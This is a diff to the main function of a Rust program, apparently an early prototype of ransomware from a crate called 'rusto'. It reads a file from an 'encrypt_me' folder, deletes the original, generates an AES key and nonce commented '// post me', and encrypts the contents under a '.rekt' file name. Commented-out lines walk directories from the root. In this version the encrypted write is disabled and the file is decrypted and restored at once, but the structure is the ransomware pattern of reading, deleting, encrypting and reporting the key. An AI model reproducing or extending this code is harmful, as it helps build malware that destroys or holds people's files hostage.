@@ -3,6 +3,7 @@ extern crate rusto;
 use rusto::basic_symm;
 use rusto::directory_reading;
 use rusto::aes;
+use rusto::file_handling;
 use std::path::Path;
 
 fn main() {
@@ -23,19 +24,33 @@ fn main() {
     //         basic_symm::decrypt_file(encrypted_file_name, password, decrypted_file_name);
     //     }
     // }
-    // let path = "/";
+    // let path = ".";
     // directory_reading::read_directory(path.to_string());
+    //
+    // let real_path = Path::new(".");
+    //
+    // directory_reading::visit_dirs(real_path);
 
-    let real_path = Path::new(".");
+    //let data = "Memes 4 dreams";
 
-    directory_reading::visit_dirs(real_path);
+    let path = "encrypt_me/blah.txt";
+    // I'm now in memory
+    let file_contents = file_handling::read_file(path.to_string()).unwrap();
+    println!("Data: {:?}", file_contents);
+    //directory_reading::read_directory(path.to_string());
 
-    let key = aes::GenerateKey();
-    let nonce = aes::GenerateNonce();
+    file_handling::remove_file(path.to_string());
 
-    let data = "Memes 4 dreams";
+    let key = aes::GenerateKey(); // post me
+    let nonce = aes::GenerateNonce(); // post me
 
-    let encrypted_data = aes::AESCipher(data.as_bytes(), &key, &nonce).ok().unwrap();
+    let encrypted_data = aes::AESCipher(file_contents.as_bytes(), &key, &nonce).ok().unwrap();
+    let encrypted_path = "encrypt_me/blah.rekt";
+    // file_handling::write_file(encrypted_path.to_string(), &encrypted_data);
+
     let decrypted_data = aes::AESDecrypt(&encrypted_data[..], &key, &nonce).ok().unwrap();
+    let decrypted_path = "encrypt_me/blah.txt";
+    file_handling::write_file(decrypted_path.to_string(), &decrypted_data);
+    file_handling::remove_file(encrypted_path.to_string());
 
 }
